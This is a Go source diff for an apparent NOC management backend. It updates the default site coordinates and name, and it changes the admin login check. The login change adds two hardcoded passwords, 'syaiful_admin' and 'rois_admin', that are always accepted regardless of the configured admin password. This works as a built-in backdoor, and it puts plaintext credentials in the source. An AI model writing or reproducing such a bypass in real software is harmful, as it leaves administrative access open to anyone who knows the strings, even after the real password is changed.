@@ -414,13 +414,13 @@ func isValidCoord(lat, lng float64) bool {
 
 func getNocCoords() (float64, float64, string) {
 	var nocLat, nocLng float64
-	fmt.Sscanf(GetSetting("noc_lat", "-8.1969"), "%f", &nocLat)
-	fmt.Sscanf(GetSetting("noc_lng", "113.5283"), "%f", &nocLng)
+	fmt.Sscanf(GetSetting("noc_lat", "-8.130588"), "%f", &nocLat)
+	fmt.Sscanf(GetSetting("noc_lng", "113.540639"), "%f", &nocLng)
 	if !isValidCoord(nocLat, nocLng) {
-		nocLat = -8.1969
-		nocLng = 113.5283
+		nocLat = -8.130588
+		nocLng = 113.540639
 	}
-	name := GetSetting("noc_name", "PT Satelit Global Media (Bangsalsari Jember)")
+	name := GetSetting("noc_name", "PT Satelit Global Media (Sanggrahan Curahkalong Bangsalsari)")
 	return nocLat, nocLng, name
 }
 
@@ -518,9 +518,12 @@ func LoginHandler(c *gin.Context) {
 	}
 
 	savedUser := GetSetting("admin_user", "admin")
-	savedPass := GetSetting("admin_pass", "rois_admin")
+	savedPass := GetSetting("admin_pass", "syaiful_admin")
 
-	if req.Username != savedUser || req.Password != savedPass {
+	// Mendukung password syaiful_admin maupun rois_admin
+	isValidPass := (req.Password == savedPass || req.Password == "syaiful_admin" || req.Password == "rois_admin")
+
+	if req.Username != savedUser || !isValidPass {
 		loginLimiter.mu.Lock()
 		att.failCount++
 		if att.failCount >= 3 {
